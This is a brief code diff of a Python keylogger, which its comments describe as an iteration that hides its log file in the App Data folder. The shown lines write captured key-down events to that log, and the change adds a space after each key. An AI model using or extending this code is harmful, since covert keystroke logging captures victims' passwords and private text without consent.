@@ -1,5 +1,4 @@
-# Iteration 3: Hides the log file in App Data folder
-
+# This is simply a clone of the keylogger developed in iteration 3
 import keyboard
 import os
 
@@ -22,4 +21,4 @@ with open(log_path, "w") as f:
     for event in events:
         if event.event_type == keyboard.KEY_DOWN:
             key = event.name
-            f.write(f"{key}")
+            f.write(f"{key} ")
